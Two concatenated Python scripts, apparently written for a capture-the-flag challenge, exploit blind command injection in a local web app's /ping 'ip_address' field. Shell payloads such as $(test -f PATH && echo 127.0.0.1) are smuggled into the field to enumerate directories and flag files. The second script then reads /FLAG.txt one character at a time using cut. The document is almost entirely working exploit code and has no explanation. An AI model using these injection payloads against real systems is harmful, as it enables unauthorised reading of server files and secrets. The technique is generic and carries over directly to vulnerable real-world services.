import requests

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def get_status(text):
    if "reachable" in text.lower() and "unreachable" not in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    return "UNKNOWN"

def check_file(path):
    """Check if file exists using boolean blind command injection"""
    payload = f"$(test -f {path} && echo 127.0.0.1)"
    resp = send_ping(payload)
    return get_status(resp) == "REACHABLE"

def check_dir(path):
    """Check if directory exists using boolean blind command injection"""
    payload = f"$(test -d {path} && echo 127.0.0.1)"
    resp = send_ping(payload)
    return get_status(resp) == "REACHABLE"

print("FILESYSTEM ENUMERATION - Finding Flag Location")
print("=" * 70)

# First, test the technique works
print("\n[Technique Validation]")
test_cases = [
    ("/etc/hostname (should exist)", "test -f /etc/hostname"),
    ("/NONEXISTENT (should not exist)", "test -f /NONEXISTENT_abc123"),
]
for desc, cmd in test_cases:
    payload = f"$({cmd} && echo 127.0.0.1)"
    resp = send_ping(payload)
    status = get_status(resp)
    marker = "[+]" if status == "REACHABLE" else "[-]"
    print(f"{marker} {desc}: {status}")

# Enumerate directories
print("\n[Directory Enumeration]")
dirs_to_check = [
    "/", "/app", "/root", "/home", "/tmp", "/var", "/opt", "/srv",
    "/challenge", "/ctf", "/flags", "/data", "/app/static"
]

existing_dirs = []
for d in dirs_to_check:
    if check_dir(d):
        marker = "[DIR]"
        existing_dirs.append(d)
        print(f"{marker} {d}")

print("\n[Flag File Enumeration in Existing Directories]")
flag_names = ["flag", "flag.txt", "FLAG", "FLAG.txt", "flag.php", "flag.html"]

found_flags = []
for d in existing_dirs:
    for flag_name in flag_names:
        path = f"{d}/{flag_name}" if d != "/" else f"/{flag_name}"
        if check_file(path):
            marker = "[!]"
            found_flags.append(path)
            print(f"{marker} FOUND: {path}")

# Additional flag locations
print("\n[Additional Flag Location Tests]")
additional_paths = [
    "/flag", "/flag.txt", "/FLAG", "/FLAG.txt",
    "/root/flag", "/home/flag", "/var/www/flag",
    "/app/flag.php", "/app/app.py", "/app/main.py",
    "/app/templates/flag.txt", "/app/static/flag",
    "/secret", "/secret.txt"
]

for path in additional_paths:
    if check_file(path):
        marker = "[!]"
        found_flags.append(path)
        print(f"{marker} FOUND: {path}")

print("\n" + "=" * 70)
if found_flags:
    print(f"Found {len(found_flags)} flag candidate(s):")
    for f in found_flags:
        print(f"  - {f}")
else:
    print("No standard flag files found in expected locations.")
    print("May need deeper enumeration or different flag naming.")

import requests
import string
import time

base_url = "http://127.0.0.1:32943"
endpoint = "/ping"

headers = {"Content-Type": "application/x-www-form-urlencoded"}

def send_ping(payload):
    data = {"ip_address": payload}
    try:
        resp = requests.post(f"{base_url}{endpoint}", data=data, headers=headers, timeout=10)
        return resp.text
    except Exception as e:
        return f"ERROR: {e}"

def get_status(text):
    if "reachable" in text.lower() and "unreachable" not in text.lower():
        return "REACHABLE"
    elif "unreachable" in text.lower():
        return "UNREACHABLE"
    return "UNKNOWN"

def check_char_at_position(file_path, position, char):
    """Check if character at position equals expected char"""
    # Using cut to extract character
    payload = f"$(test $(cut -c{position} {file_path}) = '{char}' && echo 127.0.0.1)"
    resp = send_ping(payload)
    return get_status(resp) == "REACHABLE"

print("FLAG EXTRACTION FROM /FLAG.txt")
print("=" * 70)

# First, determine file length
target_file = "/FLAG.txt"

print(f"\n[Step 1] Determining file length...")
length = 0
for i in range(1, 200):
    # Check if position i has content
    payload = f"$(test $(cut -c{i} {target_file} | wc -c) -gt 0 && echo 127.0.0.1)"
    resp = send_ping(payload)
    status = get_status(resp)
    if status == "REACHABLE":
        length = i
        print(f"  Position {i}: has content")
    else:
        print(f"  Position {i}: empty -> stopping")
        break

print(f"\n[*] File has {length} characters")

# Now extract each character
print(f"\n[Step 2] Extracting {length} characters...")

# Character set - printable ASCII
charset = string.ascii_letters + string.digits + string.punctuation + ' '

flag = ""

for pos in range(1, length + 1):
    found = False
    for char in charset:
        payload = f"$(test $(cut -c{pos} {target_file}) = '{char}' && echo 127.0.0.1)"
        resp = send_ping(payload)
        status = get_status(resp)
        if status == "REACHABLE":
            flag += char
            print(f"  Position {pos}: '{char}' -> Flag so far: {flag}")
            found = True
            break
    
    if not found:
        # Try other characters or special handling
        flag += "?"
        print(f"  Position {pos}: CHARACTER NOT FOUND IN CHARSET")

print(f"\n{'='*70}")
print(f"[*] EXTRACTED FLAG: {flag}")
print(f"{'='*70}")

